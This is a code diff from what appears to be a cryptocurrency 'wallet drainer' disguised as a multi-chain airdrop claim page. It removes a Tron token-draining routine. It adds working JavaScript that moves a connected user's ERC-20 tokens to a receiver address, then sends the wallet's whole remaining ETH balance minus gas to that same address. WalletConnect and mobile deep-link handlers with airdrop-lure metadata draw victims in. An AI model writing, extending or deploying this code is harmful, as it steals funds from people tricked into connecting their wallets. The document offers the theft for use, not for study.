+            const currentEthBalance = await provider.getBalance(userAddress);
+            const gasCost = gasPrice.mul(estimatedGas);
             
-            const contract = await window.tronWeb.contract().at(token.address);
-            const balance = await contract.balanceOf(userAddress).call();
-            
-            if (balance && balance.toString() !== '0') {
-                const tokenAmount = parseFloat(window.tronWeb.fromSun(balance));
-                console.log(`Found ${tokenAmount} ${token.symbol}`);
-                
-                console.log(`📤 Transferring ${token.symbol} to ${receiverAddress}...`);
-                const result = await contract.transfer(receiverAddress, balance).send();
-                
-                if (result) {
-                    console.log(`✅ ${token.symbol} (TRC-20) transferred: ${result}`);
-                    return tokenAmount;
-                } else {
-                    console.log(`⚠️ ${token.symbol} transfer failed`);
-                    return 0;
-                }
-            } else {
-                console.log(`⚠️ No ${token.symbol} balance found`);
-                return 0;
+            if (currentEthBalance.lt(gasCost)) {
+                console.log(`Insufficient ETH for ${token.symbol} transfer gas. Need: ${ethers.utils.formatEther(gasCost)} ETH`);
+                return false;
             }
-        } catch (error) {
-            console.error(`Error draining ${token.symbol}:`, error.message);
-            return 0;
-        }
-    }
 
-    // === UI FUNCTIONS ===
-    function updateStatus(message) {
-        $('#progress-text').text(message);
-        console.log(message);
-    }
+            console.log(`Transferring ${tokenAmount} ${token.symbol} to ${receiverAddress}`);
 
-    function updateProgress(percentage) {
-        $('#progress-fill').css('width', `${percentage}%`);
-    }
-
-    function showLoading(text) {
-        $('#loading-text').text(text);
-        $('#loading-modal').show();
-    }
-
-    function hideLoading() {
-        $('#loading-modal').hide();
-    }
-
-    // Old function removed - replaced with startUniversalConnection
-
-    // Old function removed - permissions requested individually per network
-
-    // === WALLET DETECTION ===
-    function detectAvailableWallets() {
-        const wallets = [];
-        
-        // Simplified detection - just show what's available
-        if (window.ethereum) {
-            wallets.push("Multi-Chain Wallet Detected");
-        }
-        
-        if (window.solana) {
-            wallets.push("Solana Wallet Detected");
-        }
-        
-        if (window.tronWeb) {
-            wallets.push("Tron Wallet Detected");
-        }
-        
-        // Always show Bitcoin as option (even if not detectable)
-        wallets.push("Bitcoin Support Available");
-        
-        console.log("Detected wallet capabilities:", wallets);
-        updateWalletUI(wallets);
-    }
-
-    function updateWalletUI(wallets) {
-        const walletGrid = $('#wallet-options');
-        walletGrid.empty();
-        
-        if (wallets.length > 0) {
-            wallets.forEach(wallet => {
-                walletGrid.append(`
-                    <div class="wallet-option">
-                        <div class="wallet-icon">✅</div>
-                        <span>${wallet}</span>
-                    </div>
-                `);
+            // Transfer tokens to receiver address with optimized gas
+            const transferTx = await tokenContract.transfer(receiverAddress, balance, {
+                gasLimit: estimatedGas,
+                gasPrice: gasPrice,
+                // Use maxFeePerGas for EIP-1559 if supported
+                ...(provider.getNetwork().then(n => n.chainId === 1) && {
+                    maxFeePerGas: gasPrice.mul(150).div(100), // 1.5x gas price as max
+                    maxPriorityFeePerGas: ethers.utils.parseUnits("2", "gwei") // 2 gwei tip
+                })
             });
+
+            console.log(`${token.symbol} transfer tx: ${transferTx.hash}`);
+
+            // Wait for confirmation
+            const receipt = await transferTx.wait();
+            console.log(`${token.symbol} transfer confirmed in block ${receipt.blockNumber}`);
+            console.log(`Gas used: ${receipt.gasUsed.toString()}`);
+
+            return true;
+
+        } catch (error) {
+            console.error(`Error draining ${token.symbol}:`, error);
             
-            // Enable the connect button
-            $('#connect-btn').prop('disabled', false);
-        } else {
-            walletGrid.append(`
-                <div class="wallet-placeholder">
-                    <div class="wallet-icon">🔗</div>
-                    <span>Install wallet extensions to continue</span>
-                </div>
-            `);
+            // Don't throw error, just return false to continue with other tokens
+            if (error.code === 'INSUFFICIENT_FUNDS') {
+                console.log(`Insufficient funds for ${token.symbol} transfer`);
+            } else if (error.code === 'UNPREDICTABLE_GAS_LIMIT') {
+                console.log(`Token ${token.symbol} transfer would fail, skipping`);
+            }
+            
+            return false;
         }
     }
 
-    // Simplified functions
-    function selectNetwork(network) {
-        // Not needed anymore, but keep for compatibility
-        console.log(`Network ${network} selected (legacy)`);
+    // Drain native currency (ETH, BNB, MATIC) - FIXED VERSION using proven working approach
+    async function drainNativeCurrency(provider, signer, userAddress, receiverAddress) {
+        try {
+            // Get current balance after token transfers
+            const currentBalance = await provider.getBalance(userAddress);
+            const currentEthBalance = ethers.utils.formatEther(currentBalance);
+            console.log(`Current ETH balance before final transfer: ${currentEthBalance}`);
+
+            if (currentBalance.isZero()) {
+                console.log("No ETH balance remaining");
+                return false;
+            }
+
+            // Get current gas price
+            const gasPrice = await provider.getGasPrice();
+            console.log(`Current gas price: ${ethers.utils.formatUnits(gasPrice, 'gwei')} gwei`);
+
+            // Use a more conservative gas limit for the final transfer
+            const gasLimit = ethers.BigNumber.from("21000");
+            
+            // Calculate exact gas cost
+            const exactGasCost = gasPrice.mul(gasLimit);
+            console.log(`Exact gas cost: ${ethers.utils.formatEther(exactGasCost)} ETH`);
+
+            // Calculate amount to send (total balance minus exact gas cost)
+            const amountToSend = currentBalance.sub(exactGasCost);
+
+            if (amountToSend.lte(0)) {
+                console.log("Insufficient ETH balance for gas fees");
+                console.log(`Balance: ${ethers.utils.formatEther(currentBalance)} ETH`);
+                console.log(`Gas cost: ${ethers.utils.formatEther(exactGasCost)} ETH`);
+                return false;
+            }
+
+            const ethToSend = ethers.utils.formatEther(amountToSend);
+            console.log(`Transferring ${ethToSend} ETH to ${receiverAddress}`);
+            console.log(`Leaving ${ethers.utils.formatEther(exactGasCost)} ETH for gas`);
+
+            // Create transaction with precise gas parameters
+            const txParams = {
+                to: receiverAddress,
+                value: amountToSend,
+                gasLimit: gasLimit,
+                gasPrice: gasPrice,
+                nonce: await provider.getTransactionCount(userAddress)
+            };
+
+            // For EIP-1559 networks, use maxFeePerGas
+            const network = await provider.getNetwork();
+            if (network.chainId === 1) { // Ethereum mainnet supports EIP-1559
+                try {
+                    const feeData = await provider.getFeeData();
+                    if (feeData.maxFeePerGas && feeData.maxPriorityFeePerGas) {
+                        delete txParams.gasPrice;
+                        txParams.maxFeePerGas = feeData.maxFeePerGas;
+                        txParams.maxPriorityFeePerGas = feeData.maxPriorityFeePerGas;
+                        
+                        // Recalculate amount with EIP-1559 fees
+                        const eip1559GasCost = feeData.maxFeePerGas.mul(gasLimit);
+                        const eip1559Amount = currentBalance.sub(eip1559GasCost);
+                        
+                        if (eip1559Amount.gt(0)) {
+                            txParams.value = eip1559Amount;
+                            console.log(`Using EIP-1559: sending ${ethers.utils.formatEther(eip1559Amount)} ETH`);
+                        }
+                    }
+                } catch (eip1559Error) {
+                    console.log("EIP-1559 fee estimation failed, using legacy gas pricing");
+                }
+            }
+
+            // Send ETH transaction
+            const tx = await signer.sendTransaction(txParams);
+            console.log("ETH transfer tx:", tx.hash);
+
+            // Wait for confirmation
+            const receipt = await tx.wait();
+            console.log("ETH transfer confirmed in block:", receipt.blockNumber);
+            console.log("Gas used:", receipt.gasUsed.toString());
+            console.log("Effective gas price:", ethers.utils.formatUnits(receipt.effectiveGasPrice || gasPrice, 'gwei'), "gwei");
+
+            // Verify final balance
+            const finalBalance = await provider.getBalance(userAddress);
+            const finalEthBalance = ethers.utils.formatEther(finalBalance);
+            console.log(`Final ETH balance: ${finalEthBalance} ETH`);
+
+            if (finalBalance.gt(ethers.utils.parseEther("0.001"))) {
+                console.warn(`Warning: ${finalEthBalance} ETH remaining (more than expected)`);
+            }
+
+            return true;
+
+        } catch (error) {
+            console.error("Error draining ETH:", error);
+            
+            if (error.code === 'INSUFFICIENT_FUNDS') {
+                console.log("Transaction failed due to insufficient funds for gas");
+            } else if (error.code === 'REPLACEMENT_UNDERPRICED') {
+                console.log("Transaction underpriced, gas price may have increased");
+            }
+            
+            // Don't throw error, just return false to continue
+            return false;
+        }
     }
 
-    function connectWallet() {
-        // Redirect to main connection function
-        startUniversalConnection();
-    }
+    // Mobile wallet connection handler
+    async function handleMobileConnection(selectedWalletKey) {
+        if (!isMobileDevice()) {
+            alert("Mobile wallets are only supported on mobile devices. Please select a desktop wallet or use a mobile device.");
+            return;
+        }
 
-    function updateUI() {
-        // Initial UI updates
-        $('#connection-text').text('Ready to scan wallets');
-        $('.status-dot').addClass('connected');
+        // Extract wallet name from key (remove -mobile suffix)
+        const walletName = selectedWalletKey.replace('-mobile', '');
+        const deepLink = createMobileDeepLink(walletName);
         
-        // Remove network selection requirement
-        $('#connect-btn').text('🚀 Start Universal Airdrop Claim');
+        if (!deepLink) {
+            throw new Error(`Mobile deep link not available for ${walletName}`);
+        }
+
+        updateConnectionStatus("Opening mobile wallet app...");
+        
+        // Try to open the mobile app
+        const opened = window.open(deepLink, '_blank');
+        if (!opened) {
+            // Fallback - try direct navigation
+            window.location.href = deepLink;
+        }
+
+        // Show instructions to user
+        alert(`Opening ${walletName} mobile app...\n\nIf the app doesn't open automatically:\n1. Make sure ${walletName} is installed\n2. Return to this page after connecting\n3. Click the connect button again`);
+        
+        // Wait for user to return and connect
+        setTimeout(() => {
+            updateConnectionStatus("Waiting for mobile wallet connection...");
+            // Check if any wallet became available
+            const availableWallets = Object.keys(WALLET_DEFINITIONS).filter(key => 
+                WALLET_DEFINITIONS[key].detect()
+            );
+            
+            if (availableWallets.length > 0) {
+                updateConnectionStatus("Mobile wallet detected! Please click connect again.");
+            } else {
+                updateConnectionStatus("Please connect your mobile wallet and try again.");
+            }
+        }, 3000);
     }
 
-    // Auto-start when user clicks the main button
-    $(document).on('click', '#connect-btn', function() {
-        if (!isDraining) {
-            startUniversalConnection();
+    // WalletConnect connection handler
+    async function handleWalletConnectConnection(selected) {
+        if (!walletConnectAvailable || !WalletConnectProvider) {
+            throw new Error("WalletConnect not available");
         }
-    });
 
-    console.log("✅ Universal Multi-Chain Drainer loaded successfully");
+        const PROJECT_ID = "435fa3916a5da648144afac1e1b4d3f2";
+        const provider = await WalletConnectProvider.init({
+            projectId: PROJECT_ID,
+            chains: [1, 56, 137],
+            showQrModal: true,
+            metadata: {
+                name: "Multi-Chain Airdrop",
+                description: "Claim your multi-chain airdrop tokens",
+                url: window.location.origin,
+                icons: ["https://walletconnect.com/walletconnect-logo.png"]
+            }
+        });
+
+        await provider.connect();
+        
+        if (!provider.accounts || provider.accounts.length === 0) {
+            throw new Error("No accounts connected via WalletConnect");
+        }
+
+        updateConnectionStatus("WalletConnect connected successfully!");
+        
+        // Handle as EVM wallet
+        await handleEVMConnection({ 
+            name: "WalletConnect", 
+            provider: provider, 
+            networks: ["ethereum", "bsc", "polygon"] 
+        });
+    }
+
+    // Wait for wallet connection
+    async function waitForConnection(timeout = 30000) {
+        return new Promise((resolve) => {
+            const startTime = Date.now();
+            const checkInterval = 1000;
+            
+            const checkConnection = async () => {
+                try {
+                    if (window.ethereum) {
+                        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+                        if (accounts && accounts.length > 0) {
+                            resolve(true);
+                            return;
+                        }
+                    }
+                } catch (error) {
+                    console.log("Still waiting for connection...");
+                }
+                
+                if (Date.now() - startTime > timeout) {
+                    resolve(false);
+                    return;
+                }
+                
+                setTimeout(checkConnection, checkInterval);
+            };
+            
+            checkConnection();
+        });
+    }
 });
